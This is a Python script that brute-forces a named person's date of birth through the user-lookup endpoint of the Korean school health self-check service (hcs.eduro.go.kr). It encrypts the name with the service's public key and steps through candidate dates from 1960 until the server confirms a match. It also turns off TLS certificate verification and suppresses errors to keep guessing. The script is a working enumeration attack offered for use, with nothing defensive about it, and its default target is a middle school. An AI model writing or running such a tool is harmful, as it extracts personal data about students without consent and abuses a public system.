import requests
import datetime as dt
from base64 import b64decode, b64encode
from Cryptodome.Cipher.PKCS1_v1_5 import new
from Cryptodome.PublicKey.RSA import importKey
from dateutil.relativedelta import relativedelta as redelta
import ssl

ssl._create_default_https_context = ssl._create_unverified_context
BASEURL = 'hcs.eduro.go.kr/'


def encrypt(s):
    return b64encode(new(importKey(b64decode(
        'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA81dCnCKt0NVH7j5Oh2+SGgEU0aqi5u6sYXemouJWXOlZO3jqDsHYM1qf'\
        'EjVvCOmeoMNFXYSXdNhflU7mjWP8jWUmkYIQ8o3FGqMzsMTNxr+bAp0cULWu9eYmycjJwWIxxB7vUwvpEUNicgW7v5nCwmF5HS33'\
        'Hmn7yDzcfjfBs99K5xJEppHG0qc+q3YXxxPpwZNIRFn0Wtxt0Muh1U8avvWyw03uQ/wMBnzhwUC8T4G5NclLEWzOQExbQ4oDlZBv'\
        '8BM/WxxuOyu0I8bDUDdutJOfREYRZBlazFHvRKNNQQD2qDfjRz484uFs7b5nykjaMB9k/EJAuHjJzGs9MMMWtQIDAQAB=='
    ))).encrypt(message=s.encode('utf-8')[:245])).decode('utf-8')


def OrgCode(sName: str, level: int=3):
    params = {
        'lctnScCode': '13',
        'schulCrseScCode': str(level),
        'orgName': sName,
        'loginType': 'school'
    }
    return requests.get(url='https://'+BASEURL+'/v2/searchSchool', params=params).json()['schulList'][0]['orgCode']


def findUser(birth, eName, orgCode):
    jData: dict = {
        "orgCode": orgCode,
        "name": eName,
        "birthday": encrypt(birth),
        "stdntPNo": None,
        "loginType": "school"
    }
    return requests.post(url='https://cne'+BASEURL+'/v2/findUser', json=jData).json()


def find(
        name, yy=None, mm=None, dd=None,
        sName='서일중학교', level=3, tMode=False,
        ):
    date = dt.date(1960, 1, 1)
    orgCode = OrgCode(sName, int(level))
    eName = encrypt(name)

    if yy and int(yy):
        date = date.replace(year=int(yy))
    if mm and int(mm):
        date = date.replace(month=int(mm))
    if dd and int(dd):
        date = date.replace(day=int(dd))

    err = 0
    while True:
        dateStr = dt.date.strftime(date, '%y%m%d')
        print(f'\r찾는 중... {dateStr}(오류 {err}회 발생)', end='')
        try:
            if not findUser(dateStr, eName, orgCode).get('isError'):
                print(dt.date.strftime(date, f'\r{name} 님의 주민등록 상 생년월일(YYMMDD)은 %y%m%d입니다.(오류 {err}회 발생)'))
                break
        except KeyboardInterrupt:
            print(f'\nCTRL-C가 눌려 중단합니다.')
            break
        except:
            err += 1
            continue
        if tMode and date.year>=2000:
            print(f'\n{date.year}>=2000로 탐색을 중지하였습니다.')
            break
        date += redelta(years=1) if (not yy) and mm and dd else (redelta(months=1) if (not yy and dd) and dd else redelta(days=1))
